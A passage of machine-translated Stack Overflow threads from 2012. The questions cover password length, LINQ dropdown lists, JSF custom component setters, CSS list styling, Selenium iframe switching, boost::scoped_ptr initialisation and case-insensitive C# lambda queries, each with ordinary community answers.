关于长度本身：如果无法进行暴力攻击，我认为 6 个字符的密码可以满足安全要求**。**（将分布式系统视为破解密码的一种非常强大的方法）。

维基[百科的文章](http://en.wikipedia.org/wiki/Password_strength)似乎对此事有一定的深度。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:44:02.523

这取决于允许使用哪些字符。

无论如何，六位密码是不够安全的。

您可以使用这个安全计算器：[http ://daleswanson.org/things/password.htm](http://daleswanson.org/things/password.htm)

# jquery - linq jsonresult 下拉列表

> ID：11866976
> 
> 赞同：0
> 
> 时间：2012-08-08T14:40:45.983
> 
> 标签：jquery, linq, jsonresult

我正在使用以下控制器填充年份的下拉列表。我不想手动列出年份，而是想从数据库中检索一个列表。我创建了一个 linq 查询并将年份返回到一个列表中，但我不知道如何将该列表放入正在传递的列表中。

```
 public JsonResult PopulateYears()
    {
        var list = new object[] { };

        list = new object[] {
            new { value = 2001, name = "2001" },
            new { value = 2002, name = "2002" },
            new { value = 2003, name = "2003" }
        };

        var results = dbBudget.Estimates.Select(o => o.Year).Distinct().ToList();

        foreach (var result in results)
        {
            //How do I create entries for list here?
        }

        return Json(list);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:43:57.323

你可以像这样创建一个匿名类型

```
var list = (from x in dbBudget.Estimates.Select(o => o.Year).Distinct()
select new {value=x.Year,name = x.Year}); 
```

然后就用你的线

```
return Json(list); 
```

结果将是

```
[{"name":"2011","value":"2011"},{"name":"2012","value":"2012"},{"name":"2010","value":"2010"}] 
```

# jsf - 具有属性值表达式语言的 JSF 2 自定义组件不会触发属性设置器

> ID：11866981
> 
> 赞同：8
> 
> 时间：2012-08-08T14:40:55.750
> 
> 标签：jsf, jsf-2, attributes, custom-component

我在 JSF 2.0 中构建了一个自定义组件

标签如下所示：

```
<x:myTag id="1" name="AAA" /> 
```

对应的java类：

```
@FacesComponent("a.b.c.MyTag")
public class UIMyTag extends UIInput {

   private String name;
   private String id;

   public String getId() {
      return id;
   }

   public void setId(String id) {
       this.id = id;
   }

   public String getId() {
      return id;
   }

   public void setId(String id) {
       this.id = id;
   }

   public String getName() {
      return name;
   }

   public void setName(String name) {
       this.name = name;
   }

   @Override
   public void encodeBegin(FacesContext context) throws IOException {
       ResponseWriter writer = context.getResponseWriter();
       logger.debug(getName()); //prints null for name="#{dummyBean.name}" 
                                //   and AAA for name="AAA"
       logger.debug(getAttributes().get("name")); // always correct value
   ...
}
   ....

} 
```

如果我使用

```
<x:myTag id="1" name="AAA" /> 
```

一切都按预期工作，但是当我将 EL 用于 myTag 属性时，该`setName()`方法永远不会被调用。因此对于，

```
<x:myTag id="#{dummyBean.id}" name="#{dummyBean.name}" /> 
```

我总是在我的方法中`null`获取`name`属性。`encodeBegin`调试后，我注意到该`setName`方法永远不会被调用。我认为可能关于 EL 的某些事情会搞砸（我仍然相信原因与此有关），但真正奇怪的是该`id`属性运行良好：setter 被调用，并且在 econding 开始时值与预期一致.

我不得不提一下，如果我`getAttributes().get("name")`从`encodeBegin`方法调用我会得到正确的名称值，但我很好奇为什么它不适用于 getter 和 setter。

任何想法我的组件缺少什么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-08T16:13:56.330

这种行为是预期的并且是规范的。作为值表达式的属性值由 设置[`UIComponent#setValueExpression()`](http://docs.oracle.com/javaee/6/api/javax/faces/component/UIComponent.html#setValueExpression%28java.lang.String,%20javax.el.ValueExpression%29)。它们应该只在*真正*被使用时才被评估，通常是在视图渲染期间。

( `id`and `binding`) 属性有特殊处理：它在视图构建期间在设置*之前*进行评估，因此将调用“常规”设置器而不是(因为当(or ) 属性动态评估为时，视图的`setValueExpression()`渲染会崩溃由于某种原因，与视图构建期间的值不同）。`id``binding`

更好的是将 getter/setter 委托[`UIComponent#getStateHelper()`](http://docs.oracle.com/javaee/6/api/javax/faces/component/UIComponent.html#getStateHelper%28%29)给本地属性而不是本地属性。`setValueExpression()`最终也`StateHelper`以. _`getAttributes()``StateHelper`

```
public String getName() {
   return (String) getStateHelper().eval("name");
}

public void setName(String name) {
    getStateHelper().put("name", name);
} 
```

请注意，您可以安全地删除*and*`getId()`方法`setId()`，因为它们已经在`UIComponentBase`您要扩展的超类中定义。

# css - CSS：仅为 ul 内的 li 设置样式

> ID：11866982
> 
> 赞同：3
> 
> 时间：2012-08-08T14:40:58.920
> 
> 标签：css, html-lists

我有一个带有一些列表项（li）的无序列表（ul）。其中一个在 (ul) 中有另一个无序列表。现在，我想为所有这些 li 设置相同的样式表，除了里面有另一个无序列表的 li。

```
<ul>
    <li>Element</li>
    <li>Another Element</li>
    <li>Special Element
        <ul>
            <li>Child</li>
            <li>Child</li>
        </ul>
    </li>
</ul> 
```

如何在不为特殊 li 设置特定类的情况下设置 CSS？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:41:36.020

`ul ul li { your-rules: here; }`

我建议阅读一下，它将帮助您了解级联和特异性：[http ://reference.sitepoint.com/css/inheritancecascade](http://reference.sitepoint.com/css/inheritancecascade)

- 编辑 -

抱歉，刚刚意识到您要设置样式`li`，而不是`ul li`内部样式。

`li:nth-child(3) { your-rules: here; }`

注意：`li`如果有三个或更多，这也会影响您的内部 s。

阅读[http://css-tricks.com/how-nth-child-works/](http://css-tricks.com/how-nth-child-works/)以了解我建议您使用的规则。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:47:54.487

在当前的 CSS 规范中，这是不可能的。“包含某些特定内容的元素”没有选择器。这在 CSS4 中可能是可能的，但到目前为止，您将不得不采取特殊措施来挑选出“特殊”的 li。

```
<ul>
    <li>Element</li>
    <li>Another Element</li>
    <li class="specialelement">Special Element
        <ul>
            <li>Child</li>
            <li>Child</li>
        </ul>
    </li>
</ul> 
```

并赋予班级`.specialelement`自己的风格。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:53:17.340

尝试

```
ul li > li {
   some style
} 
```

# java - 无法在 Selenium Webdriver(java) 中找到 iframe

> ID：11866983
> 
> 赞同：6
> 
> 时间：2012-08-08T14:41:01.620
> 
> 标签：java, testing, iframe, automation, selenium-webdriver

我想选择一个位于弹出窗口中的 iframe 元素。我可以进入弹出窗口但无法找到 iframe。下面是弹出窗口的html代码。

```
<html>
<head></head>
<body>
<iframe width="100%" height="100%" border="0" src="/some/url.do?parameter=getData">
<html>
 .
 .
 <table id="ec_table" class="tableRegion" width="20%" cellspacing="1" cellpadding="2" 
 border="0">
 <tr class="even">
 <td>
 <input type="radio" value="173" name="hier_data_id">
 </td>
 </tr>
 .
 .
 </html>
 </iframe>
 </body>
 </html> 
```

在这里，我想单击位于 iframe 内的单选按钮。我使用下面的代码在 iframe 中切换，但它没有切换到 iframe。

```
 driver.switchTo().frame(myD.findElement(By.tag("iframe"))); 
```

由于 iframe 没有 id，我发现很难在 iframe 中定位元素。

有谁知道我该怎么做..？

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-09T14:44:27.867

您可以通过索引切换到帧。尝试以下操作：

```
//go to popup
//switch to the first frame , assuming there's only one frame with no id or name
driver.switchTo().frame(0);
driver.findElement(By.name("hier_data_id")).click(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T15:41:16.447

由于 iframe 有 id 参考[这里](http://www.w3schools.com/tags/tag_iframe.asp)，你的答案如下

```
<iframe width="100%" height="100%" border="0" id="iframe"
                  src="/some/url.do?parameter=getData"> 
```

你的代码是

```
driver.switchTo().frame(myD.findElement(By.id("iframe"))); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-18T05:38:37.950

//iframe[@src="/some/url.do?parameter=getData"]

但这可能是时间和加载问题。因此，您可能会在内容加载之前尝试与 iframe 进行写入/读取/交互。在选择它之前尝试检查元素。如果它不存在，请等待。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-06-30T04:32:18.653

这是选择 iFrame 并输入文本“测试数据”的代码

```
$x = $I->grabAttributeFrom('//iframe', 'id');
$I->switchToIframe($x);
$I->fillField('#tinymce', 'Test data');
$I->switchToWindow();` 
```

如果你有两个iFrame一个接一个你可以通过这个功能进行切换

```
$I->switchToWindow(); 
```

# c++ - 推迟 boost::scoped_ptr 的初始化

> ID：11866996
> 
> 赞同：1
> 
> 时间：2012-08-08T14:41:44.847
> 
> 标签：c++, boost

我已经定义了一个成员变量，如下所示。由于变量不会被传递，所以我决定在这里使用 scoped_ptr 而不是 shared_ptr。

```
class ClassName
{
public:
    ClassName() 
    {
        Initialize();
    }

    virtual void Initialize() = 0;

protected:
    boost::scoped_ptr<int> m_scpInt;
}

class ClassNameB : public ClassName
{
public:
    virtual void Initialize()
    {
        m_scpInt.reset(new int(100));
    }
} 
```

由于 scoped_ptr 的限制，如果我决定稍后推迟初始化变量，我得到的唯一选择就是调用 reset。

Q1> 这是一个好习惯吗？

Q2>否则，有没有更好的解决方案？

谢谢

/// 更新 -1 ///

这是我真正想做的。

我想强制每个派生类定义一个名为 Initialize 的函数，然后该函数又调用函数 InitializeVarA 和 InitializeVarB。正如您所指出的，我们不能在构造函数中调用虚函数。

```
class ClassName
{
public:
    ClassName() 
    {
    }       
    virtual void Initialize()
        {
            InitializeVarA();
            InitializeVarB();
        }           
    protected:
        virtual void InitializeVarA() {}
        virtual void InitializeVarB() {}
}

class ClassNameB : public ClassName
{
public:
    ClassNameB() 
    {
    }       
    virtual void Initialize()
        {
            InitializeVarA();
            InitializeVarB();
        }           
    protected:
        virtual void InitializeVarA() {}
        virtual void InitializeVarB() {}
}

ClassNameB cb;
cb.Initialize(); 
```

我有比这更好的解决方案吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:52:17.717

> 这是一个好习惯吗？

使用`reset`重置作用域指针很好。

尝试通过从基类的构造函数调用虚函数来初始化派生类不仅是不好的做法。这是错的。此时，对象的动态类型是基类，而函数是纯虚拟的，因此调用它会产生未定义的行为。

即使你把它变成非纯的，你仍然不能在那个时候调用派生类的覆盖，所以指针不会被重置。

> 否则，有没有更好的解决方案？

您可以在派生类的构造函数中执行此操作，该构造函数在基类之后立即调用：

```
class Base {
public:
    Base() { /* don't call any virtual functions here */ }

protected:
    boost::scoped_ptr<int> p;
};

class Derived : public Base {
public:
    Derived() {
        p.reset(new int(100));
    }
}; 
```

或者您可以将分配的内存传递给基类构造函数并从中初始化指针。不过这有点危险——您必须确保在任何可能引发异常或内存泄漏之前立即初始化指针。

```
class Base {
public:
    Base(int * p) : p(p) {}

private: // doesn't need to be protected now
         // (unless something else in the derived class needs access)
    boost::scoped_ptr<int> p;
};

class Derived : public Base {
public:
    Derived() : Base(new int(100)) {}
}; 
```

在 C++11 中，您可以使用`unique_ptr`可移动的 来避免泄漏风险：

```
class Base {
public:
    typedef std::unique_ptr<int> ptr;
    Base(ptr && p) : p(p) {}

private:
    ptr p;
};

class Derived : public Base {
public:
    Derived() : Base(ptr(new int(100))) {}
}; 
```

# c# - 在 C# 中降低 lambda 查询

> ID：11866999
> 
> 赞同：0
> 
> 时间：2012-08-08T14:42:09.713
> 
> 标签：c#, asp.net-mvc, lambda

我在 lambda 查询中遇到 toLower() 问题。我有这个代码

```
var filterResult = articleList
                        .Where(m => m.Summary
                            .Contains(filteredModel.Keyword) || m.Body.Contains(filteredModel.Keyword) || m.Headline.Contains(filteredModel.Keyword) 
                            || m.Title.Contains(filteredModel.Keyword))
                        .AsQueryable(); 
```

我需要将 toLower() 方法添加为 sql。例如：

```
var filterResult = articleList
    .Where(m => m.Summary.toLower()
        .Contains(filteredModel.Keyword.toLower()) || m.Body.toLower().Contains(filteredModel.Keyword.toLower()) || m.Headline.toLower().Contains(filteredModel.Keyword.toLower()) 
        || m.Title.toLower().Contains(filteredModel.Keyword.toLower()))
    .AsQueryable(); 
```

如上代码，lambda 不允许使用。我想知道是否有其他方法可以做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:48:27.680

你可以达到同样的效果

```
 .Where(m => m.Summary.IndexOf(filteredModel.Keyword, StringComparison.OrdinalIgnoreCase) >= 0 
       || m.Body.IndexOf(filteredModel.Keyword, StringComparison.OrdinalIgnoreCase) >= 0 
       || m.Headline.IndexOf(filteredModel.Keyword, StringComparison.OrdinalIgnoreCase) >= 0 
       || m.Title.IndexOf(filteredModel.Keyword, StringComparison.OrdinalIgnoreCase) >= 0 
```

我认为应该得到您的 Linq 提供商的支持

您可以通过创建扩展方法来使这个更整洁[，如此处所述](https://stackoverflow.com/a/444818/630920)

```
public static bool Contains(this string source, string toCheck, StringComparison comp) {
  return source.IndexOf(toCheck, comp) >= 0;
} 
```

所以你可以这样做

```
.Where(m => m.Summary.Contains(filteredModel.Keyword, StringComparison.OrdinalIgnoreCase) 
           || m.Body.Contains(filteredModel.Keyword, StringComparison.OrdinalIgnoreCase) 
           || m.Headline.Contains(filteredModel.Keyword, StringComparison.OrdinalIgnoreCase) 
           || m.Title.Contains(filteredModel.Keyword, StringComparison.OrdinalIgnoreCase) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:50:30.013

`ToLower`应该可以工作，尝试将其分成不同的行以缩小检查失败的范围 - 请记住它不会执行，直到您实际将结果拉下来，例如

```
var keyword = filteredModel.Keyword.ToLower();
var filterResult = articleList.Where(m => m.Summary.ToLowerInvariant().Contains(keyword));
filterResult = filterResult.Where(m => m.Body.ToLower().Contains(keyword));
filterResult = filterResult.Where(m => m.Headline.ToLower().Contains(keyword));
filterResult = filterResult.Where(m => m.Title.ToLower().Contains(keyword)); 
```

Also just an FYI - if your converting to lower case for culture-independant comparison then you should be using [ToLowerInvariant](http://msdn.microsoft.com/en-us/library/system.string.tolowerinvariant.aspx)...or better yet using [ToUpperInvariant](http://msdn.microsoft.com/en-us/library/system.string.toupperinvariant.aspx) as it's more [reliable](https://stackoverflow.com/questions/6225808/string-tolower-and-string-tolowerinvariant).